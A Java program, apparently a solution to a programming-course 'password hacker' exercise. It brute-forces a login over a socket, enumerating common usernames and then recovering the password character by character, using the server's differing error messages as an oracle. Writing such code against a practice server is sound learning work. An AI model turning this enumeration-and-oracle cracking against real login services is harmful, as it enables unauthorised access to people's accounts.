package hacker.app;

import hacker.auth.Login;
import hacker.auth.Req;
import hacker.auth.RotDial;
import hacker.models.UserCredentials;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.stream.Collectors;

public final class App {

  public static final int SO_TIMEOUT = 5000;

  // CRUD-C

  private App() {
  }

  // CRUD-R

  @SuppressWarnings("PMD.AvoidReassigningLoopVariables")
  public static void main(String[] rawArgs) throws Exception {
    var args = Args.parse(rawArgs);

    // Create a new socket
    try (var sock = new Socket()) {
      // Connect to a host and a port using the socket
      System.err.println("Connecting to server...");
      sock.connect(args.socketAddr());
      sock.setSoTimeout(
          SO_TIMEOUT);  // Set a timeout to prevent indefinite waiting

      System.err.println("Connected successfully. Sending message...");

      try (var dataOut = new DataOutputStream(sock.getOutputStream());
          var dataIn = new DataInputStream(sock.getInputStream());
          var loginIter = Login.typicalLoginIter()) {
        // Auth details to crack
        var crackedCredentials = new UserCredentials(null, null);
        // Crack the login
        while (true) {
          // Login must be found before an exhaustion of the iterator.
          assert loginIter.hasNext();
          var curLogin = loginIter.next();
          var curCredentials = crackedCredentials.withLogin(curLogin);
          var authResp = Req.authenticate(dataIn, dataOut,
              curCredentials);
          if (!authResp.message().equals("Wrong login!")) {
            System.err.printf("Found login = %s\n", curLogin);
            crackedCredentials = curCredentials;
            break;
          }
        }
        // Crack the password
        var padlock = RotDial.constructDialsAsm(1);
        for (var foundPwd = false; !foundPwd; ) {
          String curPwd = padlock.stream()
              .map(pIter -> pIter.peek().toString())
              .collect(Collectors.joining());
          var response = hacker.auth.Req.authenticate(dataIn, dataOut,
              crackedCredentials.withPassword(curPwd));
          switch (response.message()) {
            case "Wrong password!":
              padlock.get(padlock.size() - 1).next();
              break;
            case "Exception happened during login":
              // Found the first characters
              padlock.add(RotDial.construct());
              break;
            case "Connection success!":
              crackedCredentials = crackedCredentials.withPassword(curPwd);
              System.err.println("Found password = " + curPwd);
              foundPwd = true;
              break;
            default:
              throw new IllegalStateException(
                  "Unexpected response: " + response);
          }
        }
        System.out.print(crackedCredentials.toJsonString());
      } catch (RuntimeException e) {
        System.err.println("Error during communication: ");
        throw e;
      }
    } catch (IOException e) {
      System.err.println("Connection error: ");
      throw e;
    }
  }
}
